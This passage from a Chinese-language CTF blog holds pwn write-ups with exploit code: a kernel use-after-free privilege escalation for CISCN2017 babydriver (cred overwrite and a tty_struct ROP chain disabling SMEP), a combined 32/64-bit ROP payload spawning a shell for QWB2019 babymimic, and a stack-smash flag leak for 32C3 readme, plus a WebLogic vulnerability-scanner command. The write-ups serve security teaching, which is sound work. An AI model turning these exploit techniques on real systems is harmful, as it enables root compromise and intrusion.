-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">git clone https://github.com/dr0op/WeblogicScan.git</span><br><span class="line">cd WeblogicScan</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 WeblogicScan.py ip 7001</span><br></pre></td></tr></table></div></figure>
-
-<p>2.有cve漏洞后上网搜索对应的利用poc来打攻击</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/CISCN2017-babydriver/">CISCN2017-babydriver</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规解包分析:</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">mkdir rootfs</span><br><span class="line">cd rootfs</span><br><span class="line">mv ../rootfs.cpio rootfs.cpio.gz //改名，方便gunzip识别格式</span><br><span class="line">gunzip ./rootfs.cpio.gz //解压</span><br><span class="line">cpio -idm &lt; ./rootfs.cpio //再次解压</span><br></pre></td></tr></table></div></figure>
-
-<p>2.查看init</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></div></figure>
-
-<p>可以看到加载了/lib/modules/4.4.72/babydriver.ko模块，权限为1000即普通权限，但是flag在root/下，需要root权限，那么需要提权。</p>
-<p>3.查看启动qemu命令：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64\ </span><br><span class="line">-initrd rootfs.cpio\</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;\</span><br><span class="line">-enable-kvm \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-m 64M \</span><br><span class="line">--nographic\</span><br><span class="line">-smp cores=1,threads=1 \</span><br><span class="line">-cpu kvm64,+smep\</span><br></pre></td></tr></table></div></figure>
-
-<p>很常规，唯一需要注意的是开启了smep保护</p>
-<p>4.IDA打开分析加载的babydriver.ko模块，一般漏洞就在这里，这里就是UAF漏洞，漏洞点在全局变量的设置：</p>
-<p>▲用到的知识点：这里由于是linux内核，那么当Linux内核模块链接到内核中，如果在Ko模块的源代码中它们具有全局变量，则每个全局变量只有一个副本，每个ko模块的设备程序共享这个全局变量</p>
-<p>(1)由于babydev_struct是个全局变量，所以打开两个babydriver.ko设备之后，第一个设备程序fd1使用command == 0x10001调用babyioctl函数，申请堆块后，如果第二个设备程序fd2再调用babyioctl函数申请堆块，则会覆盖掉babydev_struct.device_buf。</p>
-<p>(2)那么如果将第一个设备释放掉，则babydev_struct.device_buf指向的内存会被标记为释放状态，但是仍然可以通过fd2来修改这块内存，造成UAF。</p>
-<p>(3)最开始通过调用babyioctl函数将这块内存大小修改为size的堆块，之后如果再申请size大小的内存，就会先将这块内存申请回来，然后我们还是可以通过UAF使用fd2来修改这块本不应该能修改的内存。</p>
-<p>(4)这时就考虑将这块内存申请成什么样的内存来利用，这里一般有两种方法。</p>
-<p>▲方法一：利用cred结构体</p>
-<p>在kernel中，每一个进程都会创建一个cred结构体，用来存储进程的权限等信息</p>
-<p>①修改size大小为cred结构体大小，再利用fork创建子进程，过程中会创建的cred结构体，那么就可以将这块内存变成子进程的cred结构体。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">// 打开两次设备，触发伪条件竞争</span><br><span class="line">int fd1 = open(&quot;/dev/babydev&quot;, 2);</span><br><span class="line">int fd2 = open(&quot;/dev/babydev&quot;, 2);</span><br><span class="line"></span><br><span class="line">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span><br><span class="line">ioctl(fd1, 0x10001, 0xa8);</span><br><span class="line"></span><br><span class="line">// 释放fd1</span><br><span class="line">close(fd1);</span><br><span class="line"></span><br><span class="line">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span><br><span class="line">int pid = fork();</span><br></pre></td></tr></table></div></figure>
-
-<p>②之后修改子进程cred中的uid，gid为0，使其为root权限，即可将子进程提权。提权之后即可调用system(“/bin/sh”)获得root权限的shell。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">if(pid &lt; 0)</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;[*] fork error!&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else if(pid == 0)</span><br><span class="line">&#123;</span><br><span class="line">    // 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span><br><span class="line">    char zeros[30] = &#123;0&#125;;</span><br><span class="line">    write(fd2, zeros, 28);</span><br><span class="line"></span><br><span class="line">    if(getuid() == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        puts(&quot;[+] root now.&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    wait(NULL);</span><br><span class="line">&#125;</span><br><span class="line">close(fd2);</span><br></pre></td></tr></table></div></figure>
-
-<p>▲方法二：打开设备ptmx，利用创建的tty_struct结构体和修改函数指针来ROP。</p>
-<p>(一般ROP的调用需要关掉smep保护)</p>
-<p>①修改size大小为tty_struct结构体大小，释放空间，之后用户空间打开ptmx设备，就会将这块内存申请为tty_struct结构体。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);</span><br><span class="line">int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);</span><br><span class="line">ioctl(fd1, 0x10001, 0x2e0);</span><br><span class="line">close(fd1);</span><br><span class="line">int fd_tty = open(&quot;/dev/ptmx&quot;, O_RDWR|O_NOCTTY);</span><br></pre></td></tr></table></div></figure>
-
-<p>②修改tty_struct结构体中的const struct tty_operations *ops;指针指向用户空间伪造的fake_tty_operations结构体。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">size_t fake_tty_struct[4] = &#123;0&#125;;</span><br><span class="line">read(fd2, fake_tty_struct, 32);</span><br><span class="line">fake_tty_struct[3] = (size_t)fake_tty_operations;</span><br></pre></td></tr></table></div></figure>
-
-<p>③将用户空间的fake_tty_operations中的write函数指针指向ROP链。</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">//注释头</span><br><span class="line"></span><br><span class="line">void* fake_tty_operations[30];</span><br><span class="line">--------------------------------------------------------------------</span><br><span class="line">for(int i = 0; i &lt; 30; i++)</span><br><span class="line">&#123;</span><br><span class="line">    fake_tty_operations[i] = 0xFFFFFFFF8181BFC5;</span><br><span class="line">&#125;</span><br><span class="line">fake_tty_operations[0] = 0xffffffff810635f5; //pop rax; pop rbp; ret;</span><br><span class="line">fake_tty_operations[1] = (size_t)rop;</span><br><span class="line">fake_tty_operations[3] = 0xFFFFFFFF8181BFC5; // mov rsp,rax ; dec ebx ; ret</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line">int i = 0;</span><br><span class="line">size_t rop[32] = &#123;0&#125;;</span><br><span class="line">rop[i++] = 0xffffffff810d238d;		// pop rdi; ret;</span><br><span class="line">rop[i++] = 0x6f0;</span><br><span class="line">rop[i++] = 0xffffffff81004d80;		// mov cr4, rdi; pop rbp; ret;</span><br><span class="line">rop[i++] = 0;</span><br><span class="line">rop[i++] = (size_t)get_root;</span><br><span class="line">rop[i++] = 0xffffffff81063694;		// swapgs; pop rbp; ret;</span><br><span class="line">rop[i++] = 0;</span><br><span class="line">rop[i++] = 0xffffffff814e35ef;		// iretq; ret;</span><br><span class="line">rop[i++] = (size_t)get_shell;</span><br><span class="line">rop[i++] = user_cs;                /* saved CS */</span><br><span class="line">rop[i++] = user_rflags;            /* saved EFLAGS */</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br></pre></td></tr></table></div></figure>
-
-<p>④向ptmx设备写入内容，即可调用write函数从而调用ROP链。</p>
-<p>⑤利用ROP链关掉semp保护，之后Ret2Usr即可。</p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/QWB2019-babymimic/">QWB2019-babymimic</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>PWN拟态题，需要我们针对两个程序输入输出完全一致，exp要同时能够打穿两个程序。前期的爆破什么的就不看了，看<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://blog.eonew.cn/archives/1009" >EX师傅的博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>就好了</p>
-<p>1.程序分为stkof32和stkof64，大多都相同，只是一个是64一个是32，然后程序是标准栈溢出，偏移不同，32位为272字节，64位为280字节，相差8个字节。这里就为一个exp攻破两个程序提供了漏洞，另外由于程序没有开PIE，所以可以直接ROP。</p>
-<p>2.这里就用相差的8个字节，即32位程序会比64位的多运行两个指令，那么就针对这两个指令来做文章。</p>
-<p>3.这里就是将64位程序的ROP链直接放在ret地址上，32位程序利用多出来的两个指令，下拉esp，把ROP链放在64位ROP链的后面：</p>
-<p>(1)64位：</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#function(rdi,rsi,rdx)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read /bin/sh</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x0069e200</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">#execve(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0x0069e200</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(syscall)</span><br></pre></td></tr></table></div></figure>
-
-<p>(2)32位：</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#function(ebx,ecx,edx)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read /bin/sh </span></span><br><span class="line">payload += p32(pop_edx_ecx_edx_ret)</span><br><span class="line">payload += p32(<span class="number">0x200</span>)+p32(<span class="number">0x080d7200</span>)+p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">0x3</span>)</span><br><span class="line">payload += p32(int0x80)</span><br><span class="line"></span><br><span class="line"><span class="comment">#execve(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)+p32(<span class="number">0x0</span>)+p32(<span class="number">0x080d7200</span>)</span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(int0x80)</span><br></pre></td></tr></table></div></figure>
-
-<p>(3)下拉rsp：</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*offset +p32(add_0x100) + p32(<span class="number">0x0</span>)</span><br></pre></td></tr></table></div></figure>
-
-<p>▲连起来就是：</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#add esp</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*offset +p32(add_0x100) + p32(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read /bin/sh</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x0069e200</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x200</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line"><span class="comment">#execve(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0x0069e200</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(pop_rdx_ret) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload.ljust(<span class="number">0x100</span>-<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read /bin/sh</span></span><br><span class="line">payload += p32(pop_edx_ecx_edx_ret)</span><br><span class="line">payload += p32(<span class="number">0x200</span>)+p32(<span class="number">0x080d7200</span>)+p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">0x3</span>)</span><br><span class="line">payload += p32(int0x80)</span><br><span class="line"></span><br><span class="line"><span class="comment">#execve(&quot;/bin/sh&quot;,0,0)</span></span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)+p32(<span class="number">0x0</span>)+p32(<span class="number">0x080d7200</span>)</span><br><span class="line">payload += p32(pop_eax_ret) + p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(int0x80)</span><br></pre></td></tr></table></div></figure>
-
-<p>其他的就是找ROP了，这个不说了，这里能找到这么多gadget，纯粹就是因为程序是静态的，gadget无敌多，如果不是静态的，可能还得费一番功夫。</p>
-<p>参考资料：</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.dazhuanlan.com/bob24/topics/1295510" >https://www.dazhuanlan.com/bob24/topics/1295510</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/19/32C3%20CTF-readme/">32C3 CTF-readme</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，开了NX,Canary,FORTIFY。然后IDA找漏洞，sub_4007E0函数中第一次输入名字时存在栈溢出：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">__int64 v3; // [rsp+0h] [rbp-128h]</span><br><span class="line">--------------------------------------------------------------------</span><br><span class="line">_IO_gets(&amp;v3)</span><br></pre></td></tr></table></div></figure>
-
-<p>2.研究程序，有数据byte_600D20提示，点进去提示远程会读取flag到这个地方，由于这里有Canary和栈溢出，那么我们直接利用Canary的检查函数___stack_chk_fail来泄露程序中byte_600D20处的flag。</p>
-<p>3.前置知识：</p>
-<p>(1)libc2.24及以下的___stack_chk_fail函数检查到canary被修改后，会在程序结束时打印*** stack smashing detected** ”：[<strong>./readme.bin]</strong> terminate。这里红色的部分就是程序名字，程序初始化时就会读入存储到argv[0]这个参数里面。</p>
-<p>(需要注意的是，程序最开始读入的是程序的pwd绝对路径，类似于/home/ctf/readme.bin，之后会在___stack_chk_fail函数中对argv[0]中保存的字符串进行拆解，从而只打印出程序名字)</p>
-<p>(2)由于argv[0]参数是main函数的参数，程序初始化时就存储在栈上的较高地址处，我们的输入肯定是在main函数及以后的函数栈中，基本都处于较低地址处，所以一旦栈溢出足够，那么就可以覆盖到argv[0]，从而将___stack_chk_fail函数打印程序名字的地方覆盖成我们想要知道的某个地址中的值，这里也就是flag，byte_600D20。</p>
-<p>4.所以进行足够长度的覆盖，将argv[0]覆盖为0x600d20，但是由于以下函数</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">byte_600D20[v0++] = v1;</span><br><span class="line">--------------------------------------------------------------------------</span><br><span class="line">memset((void *)((signed int)v0 + 0x600D20LL), 0, (unsigned int)(32 - v0));</span><br></pre></td></tr></table></div></figure>
-
-<p>即使我们覆盖掉了argv[0]，那么打印出来的也不会是flag。这里需要用到另一个知识点：</p>
-<p>▲动态加载器根据程序头将程序映射到内存，由于程序没开PIE，所以各段的加载地址均已经固定，flag位于0x600D20，处于第二个LOAD中，会被映射到内存中的第一个LOAD中，所以0x600D20处的flag即使被覆盖，那么第一个LOAD中的flag依然存在。所以这里选择将argv[0]覆盖为第一个LOAD中的flag。</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521279.jpeg" alt="img"></p>
-<p>第一个LOAD中的flag寻找方法，peda可以查找到：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521727.jpeg" alt="img"></p>
-<p>5.现在考虑寻找argv[0]的位置，由于最开始读取的是pwd绝对路径，所以利用这个来寻找，将断点下在b *0x40080E，这里我的绝对路径是/ctf/AAAAAAAA：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521224.jpeg" alt="img"></p>
-<p>上图中画红线的两段都有可能是，都尝试一下，可以知道相差536字节，也就是第一条红线才是正确的。</p>
-<p>简单方法：直接用pwndbg&gt;p &amp;__libc_argv[0]</p>
-<p>6.尝试编写payload:</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += &quot;A&quot;*0x218</span><br><span class="line">payload += p64(flag_addr) #覆盖argv[0]</span><br></pre></td></tr></table></div></figure>
-
-<p>却发现没办法打印出来，连*** stack smashing detected ***都没办法接受到，那么肯定是远程的环境变量将stderr错误输出流设置为0，只打印在远程本地。这里用socat搭建一下，可以验证出来，远程本地上能打印出来：</p>
-<p>*** stack smashing detected ***: 32C3_TheServerHasTheFlagHere… terminated</p>
-<p>7.那么如果想通过该方法获取远程打印的flag，就需要将远程的环境变量stderr设置为1，也就是LIBC_FATAL_STDERR_=1。那么如何修改远程的环境变量呢，可以再通过gdb调试，输入stack 100：</p>
-<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191521326.jpeg" alt="img"></p>
-<p>这里的536就是所在argv[0]，再看下下面的一些数据，552，556都是环境变量，那么在远程肯定是需要调用的，这里选择修改552处的环境变量。那么之后又如何将LIBC_FATAL_STDERR_=1传过去呢？这里就想到程序有第二个输入，本来用来覆盖0x600D20的就可以被利用了。通过第二次输入将LIBC_FATAL_STDERR_=1传过去，保存在0x600D20前面部分，之后将552处的内容修改为0x600D20，这样环境变量就被更改了。</p>
-<p>8.总Payload:</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;</span><br><span class="line">payload += &quot;A&quot;*0x218</span><br><span class="line">payload += p64(0x400D20) #覆盖argv[0]</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(0x600D20) #覆盖环境变量envp指针</span><br></pre></td></tr></table></div></figure>
-
-<p>9.发送完payload后再发送LIBC_FATAL_STDERR_=1就可以将flag打印在本地了。</p>
-<p>参考资料：</p>
-<p>比较多，网上不太全，这个比较全</p>
-<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200" >https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
-</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-right"></i></a></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">93</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">40</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">43</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" 